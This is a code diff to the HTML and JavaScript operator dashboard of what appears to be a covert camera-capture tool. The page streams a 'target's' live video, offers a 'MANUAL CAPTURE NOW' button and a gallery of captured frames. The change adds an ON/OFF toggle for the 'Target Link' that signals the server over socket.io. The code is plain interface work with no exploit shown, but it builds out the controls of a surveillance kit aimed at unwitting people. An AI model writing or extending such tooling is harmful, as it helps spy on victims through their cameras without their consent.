@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard & Live Feed</title>
+    <title>Admin Dashboard & Controls</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -52,6 +52,16 @@
             font-weight: bold;
             border-radius: 6px;
             cursor: pointer;
+        }
+        .controls-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #1e1e1e;
+            padding: 12px 18px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 1px solid #444;
         }
         .live-stream-box {
             margin: 15px 0;
@@ -126,6 +136,12 @@
     <div class="container">
         <h2>👑 Admin Control Panel</h2>
 
+        <!-- Link ON/OFF Toggle Control -->
+        <div class="controls-row">
+            <span>Target Link Status:</span>
+            <button id="linkToggleBtn" onclick="toggleLinkState()" style="background-color: #2e7d32; color: white;">ACTIVE (ON)</button>
+        </div>
+
         <!-- Live Camera Stream -->
         <h3>🔴 Live Video Feed:</h3>
         <div class="live-stream-box">
@@ -133,7 +149,7 @@
             <p id="streamStatus" style="color: #888;">Target is offline</p>
         </div>
 
-        <div>
+        <div style="margin-bottom: 10px;">
             <button onclick="triggerManualCapture()" style="background-color: #ff1744; color: white;">MANUAL CAPTURE NOW</button>
         </div>
 
@@ -146,6 +162,7 @@
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
+        let isLinkActive = true;
 
         function login() {
             const pass = document.getElementById('passInput').value;
@@ -155,6 +172,19 @@
             } else {
                 document.getElementById('errMsg').style.display = 'block';
             }
+        }
+
+        function toggleLinkState() {
+            isLinkActive = !isLinkActive;
+            const btn = document.getElementById('linkToggleBtn');
+            if (isLinkActive) {
+                btn.innerText = "ACTIVE (ON)";
+                btn.style.backgroundColor = "#2e7d32";
+            } else {
+                btn.innerText = "DISABLED (OFF)";
+                btn.style.backgroundColor = "#c62828";
+            }
+            socket.emit('admin-toggle-link', isLinkActive);
         }
 
         function triggerManualCapture() {
@@ -204,7 +234,6 @@
             gallery.insertBefore(card, gallery.firstChild);
         }
 
-        // Live Frame Receiving
         socket.on('update-live-stream', (frameData) => {
             const liveImg = document.getElementById('liveFeedImg');
             const status = document.getElementById('streamStatus');
